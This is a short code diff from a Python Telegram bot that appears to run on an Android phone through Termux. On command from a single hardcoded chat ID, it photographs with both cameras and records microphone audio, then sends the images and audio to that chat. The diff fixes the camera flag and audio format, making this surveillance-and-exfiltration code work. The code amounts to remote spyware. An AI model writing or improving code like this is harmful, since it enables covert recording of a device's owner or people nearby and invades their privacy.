@@ -42,8 +42,8 @@ def start(message):
 @bot.message_handler(commands=['c'])
 def start(message):
     if message.chat.id == 831689238:
-        subprocess.run('termux-camera-photo -с 0 0.jpg', shell=True)
-        subprocess.run('termux-camera-photo -с 1 1.jpg', shell=True)
+        subprocess.run('termux-camera-photo -c 0 0.jpg', shell=True)
+        subprocess.run('termux-camera-photo -c 1 1.jpg', shell=True)
         bot.send_photo(831689238, open(r'0.jpg', 'rb'))
         bot.send_photo(831689238, open(r'1.jpg', 'rb'))
         subprocess.run('rm 0.jpg', shell=True)
@@ -52,8 +52,8 @@ def start(message):
 @bot.message_handler(commands=['m'])
 def start(message):
     if message.chat.id == 831689238:
-        subprocess.run('termux-microphone-record -f 1.wav -l 10', shell=True)
-        audio = open(r'1.wav', 'rb')
+        subprocess.run('termux-microphone-record -f 1.mp3 -l 10', shell=True)
+        audio = open('1.mp3', 'rb')
         bot.send_audio(831689238, audio)
         audio.close()
 
